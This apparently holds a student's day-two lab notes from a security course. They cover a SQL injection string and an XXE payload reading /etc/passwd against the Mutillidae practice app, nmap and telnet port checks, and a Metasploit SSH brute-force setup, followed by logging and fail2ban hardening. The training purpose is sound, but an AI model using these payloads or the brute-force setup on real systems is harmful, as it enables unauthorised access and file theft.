@@ -1,0 +1,101 @@
+=== DAY 2 ===
+
+10.82.1.8
+
+from pentest linux
+eth0
+192.168.101.104
+
+
+sudo /opt/lampp/lampp start
+
+sudo systemctl stop apache2
+
+http://192.168.101.104/mutillidae/src/index.php
+http://192.168.101.104/mutillidae/src/index.php?page=xml-validator.php
+
+
+Always true
+' OR '1'='1
+
+https://codeshare.io/5XqeyE
+
+XML Validator
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+
+nmap -v 192.168.101.104
+
+sudo su
+[enter password]
+
+cd /home/rivan/pentbox-1.8
+
+./pentbox.rb
+
+outside pc cmd
+open port 25
+telnet 192.168.101.104 25
+
+check open ports
+nmap -v IP
+nmap -v 192.168.101.104
+
+===LINUX===
+
+sudo systemctl status ssh
+
+208.8.8.133
+
+sudo systemctl status rsyslog
+
+sudo nano /etc/filebeat/filebeat.yml
+
+systemctl status elasticsearch
+systemctl enable --now elasticsearch
+
+search ssh_login
+
+set rhosts 208.8.8.133
+
+use 0
+
+set user_file /home/admin/Desktop/USERNAME
+set pass_file /home/admin/Desktop/PASSWORDS
+set stop_on_sucess true
+set verbose true
+show options
+
+
+sudo dnf -y install fail2ban
+sudo systemctl enable --now fail2ban
+fail2ban-client status
+fail2ban-client status sshd
+sudo nano /etc/fail2ban/jail.local
+
+**nano - for editing files
+
+
+[sshd]
+
+enabled = true
+port = ssh
+logpath = /var/log/secure
+maxretry = 5
+bantime = 300
+findtime = 60
+action = firewallcmd-allports
+
+sudo systemctl restart fail2ban
+
+On secureCRT
+Check BANNED IP:
+fail2ban-client status sshd
+
+TO UNBAN:
+sudo fail2ban-client set sshd unbanip "208.8.8.135"
